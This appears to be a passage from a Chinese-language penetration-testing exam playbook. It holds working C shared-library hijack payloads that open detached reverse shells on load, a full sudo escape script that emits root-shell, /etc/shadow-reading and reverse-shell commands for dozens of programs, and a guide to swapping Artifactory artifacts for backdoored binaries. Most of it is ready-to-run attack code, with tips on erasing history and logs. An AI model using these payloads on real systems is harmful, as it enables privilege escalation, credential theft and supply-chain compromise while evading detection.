#define DEFAULT_CMD "/bin/sh -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"
#endif

static int g_fired = 0;

/* 在孙进程里执行载荷：与宿主完全脱离（新会话），宿主退出也不影响已建立的会话 */
static void fire_payload(void)
{
    if (g_fired) return;
    g_fired = 1;

    const char *cmd = getenv("PAYLOAD_CMD");
    if (!cmd || !*cmd) cmd = DEFAULT_CMD;

    pid_t pid = fork();
    if (pid < 0) return;
    if (pid == 0) {
        pid_t grand = fork();
        if (grand == 0) {
            setsid();
            execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
            _exit(127);
        }
        _exit(0);            /* 中间子进程立即退出，父进程回收后不留僵尸 */
    }
    int st = 0;
    waitpid(pid, &st, 0);
}

__attribute__((constructor))
static void m13_preload_init(void)
{
    fire_payload();
}

#ifdef HOOK_GETEUID
/* 可选：劫持 geteuid 做"被调用时触发"，并转发给真实实现。
 * 转发失败时退回 getuid() 而不是返回错误码——宁可少一次提权判断，也不要让宿主崩溃。 */
uid_t geteuid(void)
{
    static uid_t (*real_geteuid)(void) = NULL;
    static int resolved = 0;

    if (!resolved) {
        union { void *sym; uid_t (*fn)(void); } u;
        u.sym = dlsym(RTLD_NEXT, "geteuid");
        real_geteuid = u.fn;
        resolved = 1;
    }

    fire_payload();

    if (real_geteuid) return real_geteuid();
    return getuid();
}
#endif
````

#### `m13-shared-library-ldlibrarypath.c`

````c
/* 用途：LD_LIBRARY_PATH 劫持场景的共享库——文件名必须与宿主缺失的库逐字符同名（含 .so.N 后缀），
 *       导出宿主会用到的符号并用 dlsym(RTLD_NEXT) 转发给真实实现，首次被调用时触发一次载荷，
 *       返回值与原生一致（宿主不崩溃、业务不中断）；constructor 也会兜底触发一次。
 * 场景：38（Linux 程序从可控位置加载共享库）
 * 依赖：gcc；Linux x86_64；-ldl（dlsym 转发必需）
 * 编译：
 *   gcc -Wall -fPIC -shared -O2 -o libmissing.so.1.1 m13-shared-library-ldlibrarypath.c -ldl
 *   # 32 位宿主：gcc -m32 -fPIC -shared -O2 -o libmissing.so.1.1 m13-shared-library-ldlibrarypath.c -ldl
 * 使用：
 *   # ① 先确认宿主缺哪个库、解析到哪个路径
 *   ldd /usr/local/bin/target | grep 'not found'
 *   LD_LIBRARY_PATH=/tmp/x ldd /usr/local/bin/target
 *   # ② 触发（服务重启 / cron / 手工执行）
 *   LD_LIBRARY_PATH=/tmp/x /usr/local/bin/target
 * 符号核对（决定成败的一步）：
 *   nm -D --defined-only /usr/lib/x86_64-linux-gnu/libmissing.so.1.1   # 抄原库导出表
 *   nm -D --undefined-only /usr/local/bin/target                        # 看宿主实际需要哪些符号
 *   缺哪个补哪个：按下面 geteuid 的模板照抄，函数名/参数/返回值必须与原库一致，否则
 *   宿主会报 "symbol lookup error" 或直接崩溃。
 * 占位符：LHOST=攻击机 IP，LPORT=监听端口（写死在 DEFAULT_CMD，或用 PAYLOAD_CMD 环境变量覆盖）
 * 测试状态：已在本机用 gcc -Wall -fPIC -c 完成编译校验；未在 Linux 目标实测
 *
 * 与 LD_PRELOAD 版本（m13-shared-library-ldpreload.c）的差别：
 *   - PRELOAD 线：任意名字都行，加载即执行，不需要导出符号。
 *   - LIBRARY_PATH 线：必须同名 + 必须补齐宿主用到的导出符号，否则链接/运行阶段就失败。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/wait.h>

#ifndef DEFAULT_CMD
#define DEFAULT_CMD "/bin/sh -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"
#endif

static int g_fired = 0;

static void fire_payload(void)
{
    if (g_fired) return;
    g_fired = 1;

    const char *cmd = getenv("PAYLOAD_CMD");
    if (!cmd || !*cmd) cmd = DEFAULT_CMD;

    pid_t pid = fork();
    if (pid < 0) return;
    if (pid == 0) {
        pid_t grand = fork();
        if (grand == 0) {
            setsid();
            execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
            _exit(127);
        }
        _exit(0);
    }
    int st = 0;
    waitpid(pid, &st, 0);
}

__attribute__((constructor))
static void m13_ldlibrarypath_init(void)
{
    fire_payload();
}

/* 解析"下一站"的真实符号：RTLD_NEXT 表示从本库之后的库（通常是 libc/原库）里找同名的真实实现 */
static void *resolve_real(const char *name)
{
    void *sym = dlsym(RTLD_NEXT, name);
    if (!sym) fprintf(stderr, "[m13] 转发解析失败 %s: %s\n", name, dlerror());
    return sym;
}

/* 导出符号模板①：geteuid —— cheat sheet 里 LD_PRELOAD/LD_LIBRARY_PATH 两节都用这个符号。
 * 第一次被调用时触发载荷，随后把调用原样转给真实 geteuid，返回值不打折。 */
uid_t geteuid(void)
{
    static uid_t (*real_geteuid)(void) = NULL;
    static int resolved = 0;

    if (!resolved) {
        union { void *sym; uid_t (*fn)(void); } u;
        u.sym = resolve_real("geteuid");
        real_geteuid = u.fn;
        resolved = 1;
    }

    fire_payload();

    if (real_geteuid) return real_geteuid();
    return getuid();
}

/* 导出符号模板②：getpid —— 演示"任意签名的符号都能照抄这个模式"。
 * 用法：把函数名、参数表、返回值类型换成目标库真实导出的符号即可（例如 libcrypto 的
 * int EVP_EncryptUpdate(EVP_CIPHER_CTX *, unsigned char *, int *, const unsigned char *, int)）。 */
pid_t getpid(void)
{
    static pid_t (*real_getpid)(void) = NULL;
    static int resolved = 0;

    if (!resolved) {
        union { void *sym; pid_t (*fn)(void); } u;
        u.sym = resolve_real("getpid");
        real_getpid = u.fn;
        resolved = 1;
    }

    fire_payload();

    if (real_getpid) return real_getpid();
    return (pid_t)0;
}
````

## 场景 39 · sudo 只允许一个编辑器或解释器

### 场景回顾
`sudo -l` 显示当前用户只被放行一个程序（如 `/usr/bin/vim`、`/usr/bin/find`、`/usr/bin/lua`，且常常是 `NOPASSWD`），该程序以 root 运行。没有其它本地提权路径。目标是**借用这个“受信任程序”本身逃逸出 shell**（GTFOBins 思路），并处理 sudoers 对参数的限制。

### 前提与假设
- `sudo -l` 确认放行条目：例如 `(root) NOPASSWD: /usr/bin/vim` 或 `(ALL) /usr/bin/find *`。
- sudoers 可能限制参数模式（如 `vim /home/user/*`、`find /var/log`），也可能不限。
- 我们能交互执行该命令（有终端或能通过 webshell/脚本触发）。

### 准备（攻击机侧）
1. 先枚举：`sudo -l`、`sudo -ll`（看参数模式）、`id`。
2. 确认放行程序在 GTFOBins 的 escape 路线（vim/find/lua 的 shell 逃逸见下）。
3. 本地监听 `nc -lvnp LPORT`（若走反连）或准备交互命令收集输出。

### 执行步骤
1. `sudo -l` 确认条目与 NOPASSWD 情况。
2. 按放行程序逃逸（可任选其一，脚本会自动匹配）：
   - **vim**：`sudo vim -c ':!/bin/sh'`（交互）；或 `sudo vim -c ':set shell=/bin/sh' -c ':shell'`；无交互需求可 `sudo vim -c ':!/bin/sh -c "id > /tmp/out; cat /tmp/out"'`。
   - **find**：`sudo find . -exec /bin/sh \; -quit`（或 `-exec /bin/sh -p \;`）；参数被限时见失败分支。
   - **lua**：`sudo lua -e 'os.execute("/bin/sh")'`；或 `sudo lua -e 'os.execute("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")'` 直接反连。
3. 进入 root shell 后确认：`id`（uid=0）。
4. 后续按目标做提权后横向/拿 flag；命令尽量短、不留历史。

### 用到的脚本
- `m13-sudo-gtfobins.sh`：解析 `sudo -l` 放行条目，给出并执行对应的 vim/find/lua 逃逸；带参数限制时的读取/外带模式。

### 验证
- `sudo -l` 条目存在且无密码提示（NOPASSWD）或我们已知 `PASS`。
- 逃逸命令返回 root shell：`id` 显示 `uid=0(root)`。
- 受限场景下能读到目标文件（`/etc/shadow`、flag）或建立反连。

### 失败分支与备选
1. **sudoers 限定了参数（如 `vim /home/user/*`）**：argv 被限制但 vim 内部命令不受限——`sudo vim /home/user/x` 进入后 `:e /etc/shadow`、`:r /etc/shadow`、`:!/bin/sh`（若允许）读取内容；find 限制路径时改用 `sudo find /home/user -exec ...` 也要看 `-exec` 是否在模式里，不行就换“读取型”逃逸。
2. **逃逸命令被 sudoers 明确禁止（如 `!*sh*`）**：换同程序其它 escape（vim 的 `:terminal`/`:python3` 如果编译带支持；find 的 `-exec sh` 被禁则试 `-exec bash`/`-exec awk`）；再不行退回“只读文件 + 外带”而非 shell。
3. **无 TTY 交互**（web 执行环境）：用非交互变体把结果写到可读文件或用 `-c '...'` 单行反连 `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`。
4. **该程序版本缺少该 escape**：查 GTFOBins 当前条目换一条（例如 vim 还有 `:!bash`、`view` 同理）；脚本内保留多条备选。
5. **sudo 需要密码且我们不知道**：本场景前提是 NOPASSWD 或已知 `PASS`；若两者皆无，这不是入口，回退到其它模块（凭据收集/服务弱点）。

### 考试注意 / OPSEC
- 先 `sudo -l` 完整看条目和注释，别假设“sudo 能跑一切”——只打被放行的那条，越界命令会被记日志。
- root shell 里禁用/清理 history：`unset HISTFILE`。
- 别在共享 sudoers 的机器上反复试错命令刷日志；一次成型。

---

#### `m13-sudo-gtfobins.sh`

````bash
#!/usr/bin/env bash
# 用途：sudo 只放行某个具体程序（vim/find/lua/less/awk/perl 等）时的逃逸命令模板集合：
#       解析 sudo -l 的放行条目 → 匹配已知可逃逸程序 → 按 shell / read / reverse 三种模式输出命令，
#       并可直接在交互终端里执行（GTFOBins 思路，覆盖参数被 sudoers 限制时的"读取型"逃逸）。
# 场景：39（sudo 只允许一个编辑器或解释器）
# 依赖：在目标 Linux 上执行；需要 sudo 与目标程序存在；reverse 模式需要攻击机有监听（nc -lvnp LPORT）
# 使用：
#   bash m13-sudo-gtfobins.sh -l                          # 解析 sudo -l，列出可逃逸的放行程序
#   bash m13-sudo-gtfobins.sh -p vim                      # 打印 vim 的 shell 逃逸命令
#   bash m13-sudo-gtfobins.sh -p find -m read -f /etc/shadow      # 无 TTY 时读取高权文件
#   bash m13-sudo-gtfobins.sh -p lua  -m reverse --lhost LHOST --lport LPORT
#   bash m13-sudo-gtfobins.sh -r vim                      # 直接执行 vim 逃逸（需要交互终端）
#   bash m13-sudo-gtfobins.sh -A                          # 打印全部程序的模板清单
# 占位符：LHOST=攻击机 IP；LPORT=监听端口（reverse 模式下替换进命令；未替换则命令里保留占位符原文）
# 测试状态：已通过 bash -n 语法校验；未在 Linux 目标实测
set -uo pipefail

SELF="$(basename "$0")"
SUPPORTED="vim vi view nvim nano ed find lua lua5.1 awk gawk perl python python3 ruby php node less more man git env nice timeout stdbuf tar zip nmap ftp gdb socat make"

MODE="shell"
PROG=""
ACTION="print"
RD_FILE="/etc/shadow"
OUT="/tmp/m13-sudo-gtfobins.out"
LHOST="LHOST"
LPORT="LPORT"

usage() {
  cat <<EOF
用法: $SELF [选项]

  -l, --list                解析 sudo -l，列出放行条目中可逃逸的程序（默认动作）
  -p, --program <名称>       打印该程序的逃逸命令（$SUPPORTED ）
  -r, --run <名称>           直接执行该程序的逃逸命令（需要交互终端）
  -m, --mode <模式>          shell(默认，拿交互 shell) | read(读取高权文件) | reverse(反弹回连)
  -f, --file <路径>          read 模式要读取的文件（默认 ${RD_FILE}）
  -o, --out <路径>           read 模式的输出文件（默认 ${OUT}）
      --lhost <LHOST>        reverse 模式的攻击机 IP（占位符 LHOST）
      --lport <LPORT>        reverse 模式的监听端口（占位符 LPORT）
  -A, --all                 打印全部支持程序的模板清单
  -h, --help                显示本帮助

示例:
  $SELF -l
  $SELF -p vim -m shell
  $SELF -p awk -m read -f /root/flag.txt
  $SELF -p python3 -m reverse --lhost LHOST --lport LPORT
  $SELF -r find
EOF
}

die() { printf '[!] %s\n' "$*" >&2; exit 2; }
info() { printf '[*] %s\n' "$*"; }
hit() { printf '[+] %s\n' "$*"; }

# 按程序 + 模式生成逃逸命令；未知组合返回非 0
escape_cmd() {
  local p="$1" m="$2"
  case "$p" in
    vim|vi|view|nvim)
      case "$m" in
        shell)   printf "sudo %s -c ':!/bin/sh'" "$p" ;;
        read)    printf "sudo %s -es -u NONE -c ':%%print' -c ':q!' %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -c ':!/bin/bash -c \"bash -i >& /dev/tcp/%s/%s 0>&1\"'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    nano)
      case "$m" in
        shell)   printf "sudo %s -s /bin/sh;  # 进入后 Ctrl+R 读文件 / Ctrl+X 退出" "$p" ;;
        read)    printf "sudo %s -B -v %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s; # ^R 读文件后 ^T 执行: bash -i >& /dev/tcp/%s/%s 0>&1" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    ed)
      case "$m" in
        shell)   printf "sudo %s; !/bin/sh" "$p" ;;
        read)    printf "sudo %s -s %s;  # 进入后输入 ,p 打印全文，q 退出" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s; !/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    find)
      case "$m" in
        shell)   printf "sudo find . -exec /bin/sh \\\; -quit" ;;
        read)    printf "sudo find %s -exec head -c 4096 {} \\\;" "$RD_FILE" ;;
        reverse) printf "sudo find . -exec /bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' \\\; -quit" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    lua|lua5.1)
      case "$m" in
        shell)   printf "sudo %s -e 'os.execute(\"/bin/sh\")'" "$p" ;;
        read)    printf "sudo %s -e 'local f=io.open(\"%s\");print(f:read(\"*a\"));f:close()'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -e 'os.execute(\"bash -i >& /dev/tcp/%s/%s 0>&1\")'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    awk|gawk)
      case "$m" in
        shell)   printf "sudo %s 'BEGIN {system(\"/bin/sh\")}'" "$p" ;;
        read)    printf "sudo %s '{print \\$0}' %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s 'BEGIN {system(\"bash -i >& /dev/tcp/%s/%s 0>&1\")}'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    perl)
      case "$m" in
        shell)   printf "sudo %s -e 'exec \"/bin/sh\";'" "$p" ;;
        read)    printf "sudo %s -ne 'print' %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -e 'exec \"bash\", \"-i\", \"&>\", \"/dev/tcp/%s/%s\";'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    python|python3)
      case "$m" in
        shell)   printf "sudo %s -c 'import pty;pty.spawn(\"/bin/sh\")'" "$p" ;;
        read)    printf "sudo %s -c 'print(open(\"%s\").read())'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -c 'import socket,os,pty;s=socket.create_connection((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    ruby)
      case "$m" in
        shell)   printf "sudo %s -e 'exec \"/bin/sh\"'" "$p" ;;
        read)    printf "sudo %s -e 'puts File.read(\"%s\")'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -rsocket -e 'exit if fork;c=TCPSocket.new(\"%s\",\"%s\");loop{c.gets;IO.popen(c,\"r+\"){|p|p.gets}}'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    php)
      case "$m" in
        shell)   printf "sudo %s -r 'system(\"/bin/sh\");'" "$p" ;;
        read)    printf "sudo %s -r 'echo file_get_contents(\"%s\");'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -r '$s=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    node)
      case "$m" in
        shell)   printf "sudo %s -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]});'" "$p" ;;
        read)    printf "sudo %s -e 'console.log(require(\"fs\").readFileSync(\"%s\",\"utf8\"))'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -e 'const n=require(\"net\"),c=new n.Socket();c.connect(%s,\"%s\",()=>c.pipe(process.stdin));'" "$p" "$LPORT" "$LHOST" ;;
        *) return 1 ;;
      esac ;;
    less|more)
      case "$m" in
        shell)   printf "sudo %s %s;  # 打开后输入 !/bin/sh" "$p" "$RD_FILE" ;;
        read)    printf "sudo %s %s;  # 非 TTY 下直接回显内容；TTY 下 q 退出" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s %s;  # 打开后输入 !bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$RD_FILE" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    man)
      case "$m" in
        shell)   printf "sudo %s man;  # 打开后输入 !/bin/sh" "$p" ;;
        read)    printf "sudo %s -P \"head -c 4096 %s\" man" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s man;  # 打开后输入 !bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    git)
      case "$m" in
        shell)   printf "sudo %s help status;  # 打开后输入 !/bin/sh" "$p" ;;
        read)    printf "sudo %s -c core.pager=\"head -c 4096 %s\" -p help" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s help status;  # 打开后输入 !bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    env|nice|timeout|stdbuf)
      case "$m" in
        shell)   printf "sudo %s /bin/sh" "$p" ;;
        read)    printf "sudo %s head -c 4096 %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    tar|zip)
      case "$m" in
        shell)   printf "sudo %s -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" "$p" ;;
        read)    printf "sudo %s -cf /dev/null %s --checkpoint=1 --checkpoint-action=exec=sh\\\\ -c\\\\ head\\\\ -c\\\\ 4096\\\\ %s" "$p" "$RD_FILE" "$RD_FILE" ;;
        reverse) printf "sudo %s -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=sh\\\\ -c\\\\ bash\\\\ -i\\\\ >&\\\\ /dev/tcp/%s/%s\\\\ 0>&1" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    nmap)
      case "$m" in
        shell)   printf "echo \"os.execute('/bin/sh')\" > /tmp/m13.nse && sudo %s --script=/tmp/m13.nse" "$p" ;;
        read)    printf "echo \"os.execute('head -c 4096 %s')\" > /tmp/m13.nse && sudo %s --script=/tmp/m13.nse" "$RD_FILE" "$p" ;;
        reverse) printf "echo \"os.execute('bash -i >& /dev/tcp/%s/%s 0>&1')\" > /tmp/m13.nse && sudo %s --script=/tmp/m13.nse" "$LHOST" "$LPORT" "$p" ;;
        *) return 1 ;;
      esac ;;
    ftp)
      case "$m" in
        shell)   printf "sudo %s;  # 进入后输入 !/bin/sh" "$p" ;;
        read)    printf "sudo %s;  # 进入后输入 ! head -c 4096 %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s;  # 进入后输入 ! bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    gdb)
      case "$m" in
        shell)   printf "sudo %s -q -nx -ex '!sh' -ex quit" "$p" ;;
        read)    printf "sudo %s -q -nx -ex '!head -c 4096 %s' -ex quit" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -q -nx -ex '!bash -i >& /dev/tcp/%s/%s 0>&1' -ex quit" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    socat)
      case "$m" in
        shell)   printf "sudo %s exec:'bash -li',pty,stderr,setsid,sigint,sane" "$p" ;;
        read)    printf "sudo %s -U FILE:%s,rdonly STDOUT" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    make)
      case "$m" in
        shell)   printf "sudo %s -s --eval=\\$'x:\\\\\\n\\\\\\t-/bin/sh'" "$p" ;;
        read)    printf "sudo %s -s --eval=\\$'x:\\\\\\n\\\\\\t-head -c 4096 %s'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -s --eval=\\$'x:\\\\\\n\\\\\\t-bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    *)
      return 1 ;;
  esac
}

print_templates() {
  local p="$1" cmd
  printf '\n=== %s ===\n' "$p"
  for m in shell read reverse; do
    if cmd="$(escape_cmd "$p" "$m")"; then
      printf '  [%s]\n    %s\n' "$m" "$cmd"
    else
      printf '  [%s] 无可用模板\n' "$m"
    fi
  done
}

do_list() {
  info "解析 sudo -l（看清放行条目与参数限制，只打被放行的那条）"
  if ! command -v sudo >/dev/null 2>&1; then
    die "当前环境没有 sudo，无法枚举放行条目"
  fi
  sudo -l 2>&1 | sed 's/^/    /'
  printf '\n'
  hit "放行条目中可逃逸的程序："
  local found=0 p sudo_out
  sudo_out="$(sudo -l 2>/dev/null)"
  for p in $SUPPORTED; do
    if printf '%s' "$sudo_out" | grep -Eq "(^|[[:space:]]|/)${p}([[:space:]]|,|$)"; then
      printf '    [+] %s -> %s\n' "$p" "$(escape_cmd "$p" "$MODE")"
      found=1
    fi
  done
  if [ "$found" -eq 0 ]; then
    info "未在 sudo -l 输出里匹配到已知可逃逸程序：检查是否限定了参数，或用 -A 看完整模板自行比对"
  fi
  printf '\n'
  info "提示：sudoers 限定参数时，shell 模式常被拦，改 -m read 做"读取型"逃逸（文件内容直接回显）"
}

do_all() {
  local p
  printf '=== 全部逃逸模板（MODE=%s）===\n' "$MODE"
  for p in $SUPPORTED; do
    if cmd="$(escape_cmd "$p" "$MODE")"; then
      printf '  %-10s %s\n' "$p" "$cmd"
    fi
  done
}

do_print() {
  local p="$1" cmd
  if ! cmd="$(escape_cmd "$p" "$MODE")"; then
    die "不支持的程序: ${p}（支持: ${SUPPORTED}）"
  fi
  printf '\n=== %s / %s 模式 ===\n' "$p" "$MODE"
  printf '%s\n' "$cmd"
  case "$MODE" in
    read)    info "无 TTY 时把输出落文件：$cmd > $OUT 2>&1" ;;
    reverse) info "攻击机先起监听：nc -lvnp ${LPORT}（记得先替换 --lhost/--lport）" ;;
    shell)   info "需要交互终端；无 TTY 场景改用 -m read 或 -m reverse" ;;
  esac
  printf '\n'
}

do_run() {
  local p="$1" cmd
  if ! cmd="$(escape_cmd "$p" "$MODE")"; then
    die "不支持的程序: ${p}（支持: ${SUPPORTED}）"
  fi
  info "执行: $cmd"
  if [ "$MODE" = "read" ]; then
    info "输出同时写入 $OUT"
    bash -c "$cmd" 2>&1 | tee "$OUT"
  else
    bash -c "$cmd"
  fi
}

# ---- 参数解析 ----
while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)   usage; exit 0 ;;
    -l|--list)   ACTION="list"; shift ;;
    -A|--all)    ACTION="all"; shift ;;
    -p|--program) [ $# -ge 2 ] || die "-p 需要参数：程序名"; PROG="$2"; ACTION="print"; shift 2 ;;
    -r|--run)    [ $# -ge 2 ] || die "-r 需要参数：程序名"; PROG="$2"; ACTION="run"; shift 2 ;;
    -m|--mode)   [ $# -ge 2 ] || die "-m 需要参数：shell|read|reverse"; MODE="$2"; shift 2 ;;
    -f|--file)   [ $# -ge 2 ] || die "-f 需要参数：文件路径"; RD_FILE="$2"; shift 2 ;;
    -o|--out)    [ $# -ge 2 ] || die "-o 需要参数：输出路径"; OUT="$2"; shift 2 ;;
    --lhost)     [ $# -ge 2 ] || die "--lhost 需要参数"; LHOST="$2"; shift 2 ;;
    --lport)     [ $# -ge 2 ] || die "--lport 需要参数"; LPORT="$2"; shift 2 ;;
    *)           usage; die "未知参数: $1" ;;
  esac
done

case "$MODE" in
  shell|read|reverse) ;;
  *) usage; die "非法 -m 模式: ${MODE}（shell|read|reverse）" ;;
esac

case "$ACTION" in
  list)  do_list ;;
  all)   do_all ;;
  print) [ -n "$PROG" ] || { usage; die "需要用 -p 指定程序名"; }; do_print "$PROG" ;;
  run)   [ -n "$PROG" ] || { usage; die "需要用 -r 指定程序名"; }; do_run "$PROG" ;;
  *)     usage; die "需要用 -l / -p / -r / -A 指定动作" ;;
esac
````

## 场景 40 · 你能覆盖制品，但不能直接登录下载制品的机器

### 场景回顾
实验里有一台制品仓库/分发服务（对齐 cheat sheet 的 **Artifactory (JFrog)** 类场景）：我们获得了对制品存储的写能力（能**覆盖/替换**某个会被下游机器下载并执行的制品），但**无法直接 SSH/登录那些下载制品的消费机器**。目标是：让消费端在下次拉取/执行该制品时跑我们的代码（反连/植入），并尽量保持制品“看起来正常”（文件名、架构、业务行为不变）以免被发现。

### 前提与假设
- 已拿到制品仓库侧的可写点（如 Artifactory 管理/上传接口、备份库里的凭据、或文件系统写权限），能定位制品在存储中的实际文件路径。
- 知道或能观察到消费端下载哪个制品、以什么方式使用它（直接执行二进制？解压 jar？跑脚本？），以及触发频率/触发方式。
- 出站回连条件沿用前面场景；`LHOST:LPORT` 可被消费端到达。

### 准备（攻击机侧）
1. 确认制品仓库进程与布局（Artifactory 常规路径 `/opt/jfrog/artifactory/`）：
   - `ps aux | grep artifactory`
   - 备份/凭据线索：`/opt/jfrog/artifactory/var/backup/access`（含加密凭据/DB 备份），或数据目录 `.../var/data/access/derby`（必要时可拷出离线看，见 cheat sheet）。
2. 定位目标制品文件：在 filestore 里按文件名/校验和找（Artifactory 通常有二进制存储目录 + 元数据），确认**架构与格式**（`file`、`readelf -h`：x86_64 消费端不能跑 arm 制品）。
3. 构造替换物：
   - 保留原业务行为（若场景要求消费端正常使用不报错），叠加我们的代码；或直接做成“先反连、再执行原逻辑”的包装。
   - 可用 `m13-xor-encoder.py`+`m13-simple-loader.c` 生成内存加载版，让落地的“制品”不含明文 payload。
4. 攻击机起监听。

### 执行步骤
1. 在制品存储中找到目标文件，先**备份原文件**（`.bak`，同目录或拷回攻击机，便于恢复与比对）。
2. 用 `m13-artifactory-replace.sh` 完成替换：备份→放入替换制品→（必要时）改回属主/权限与元数据→记录原校验和。
3. 触发/等待消费端拉取：重启/刷新消费端任务、或按仓库配置的拉取周期等待。
4. 监听确认回连；会话内确认身份/环境，收集目标信息。
5. 收尾：按需恢复原制品（脚本支持 `--restore`），清理监听与临时文件。

### 用到的脚本
- `m13-artifactory-replace.sh`：制品定位、备份、替换、权限修复、校验和核对、恢复。
- （辅）`m13-xor-encoder.py` / `m13-simple-loader.c`：把替换物做成“外衣+内存载荷”。

### 验证
- 替换后 `file`/`readelf`/`sha256sum` 符合预期（架构一致；必要时业务输出与原件一致）。
- 消费端下次拉取后监听收到回连。
- 仓库侧无报错（消费端能正常解析该制品，没因格式破坏而失败）。

### 失败分支与备选
1. **找不到制品在存储中的确切文件（元数据与文件分离）**：通过 Artifactory 的下载接口直接拉原文件比对校验和定位；或用备份库里的凭据登录管理接口走“正规上传”替换（覆盖同一 version/path）。
2. **消费端校验制品签名/校验和**：若不可绕过，改走“替换其依赖/次级文件”或“改仓库配置指向我们控制的另一个制品路径”，而不是硬换主文件。
3. **架构不符导致消费端无法运行**：用消费端同架构重编（`-m64`/`-m32`/arm）；先 `file` 原制品确认。
4. **消费端只在特定触发时才拉取（考试里时间窗口短）**：先做能主动触发的动作（若允许：触发消费端的构建/部署任务、或在该机器可达的服务上制造一次拉取），并保证我们的替换物在第一次拉取就有效。
5. **替换物破坏业务被运维发现**：包装模式（先跑原逻辑）优先；恢复脚本要在场，验证完即还原并清日志。

### 考试注意 / OPSEC
- 替换前必备份；原校验和记下来，恢复时比对。
- 别删除仓库其它文件或动备份库造成大面积告警；改动面越小越好。
- 会话内避免直接在消费端写自己的工具明文；继续用“编码+内存加载”。
- 离开前恢复原制品，避免影响后续其它场景对同一仓库的依赖。

---

#### `m13-artifactory-replace.sh`

````bash
#!/usr/bin/env bash
# 用途：制品库（Artifactory / 通用二进制仓库）制品替换流水线——
#       下载原制品 → 备份并记录原校验和 → 按同架构（elf32/elf64 自动判定）生成同名替换制品 →
#       计算校验和 → 上传覆盖 → 重新拉取比对 → 支持一键恢复原制品；
#       下游机器按周期拉取执行时，就会拿到我们的代码（场景 40）。
# 场景：40（你能覆盖制品，但不能直接登录下载制品的机器）
# 依赖：curl（下载/上传）、gcc（生成替换制品）、readelf 或 file（架构判定）、
#       python3 + m13-xor-encoder.py（把载荷编码后内嵌进替换制品）
# 使用：
#   bash m13-artifactory-replace.sh info    http://TARGET:8082/artifactory/repo/pkg.bin
#   bash m13-artifactory-replace.sh pull    http://TARGET:8082/artifactory/repo/pkg.bin
#   bash m13-artifactory-replace.sh build   ./pkg.bin -p ./stage2.bin -k 0xfa
#   bash m13-artifactory-replace.sh push    http://TARGET:8082/artifactory/repo/pkg.bin ./m13-artifactory-work/pkg.bin --user USER --pass PASS
#   bash m13-artifactory-replace.sh verify  http://TARGET:8082/artifactory/repo/pkg.bin ./m13-artifactory-work/pkg.bin
#   bash m13-artifactory-replace.sh restore http://TARGET:8082/artifactory/repo/pkg.bin ./m13-artifactory-work/pkg.bin.bak
#   bash m13-artifactory-replace.sh -h
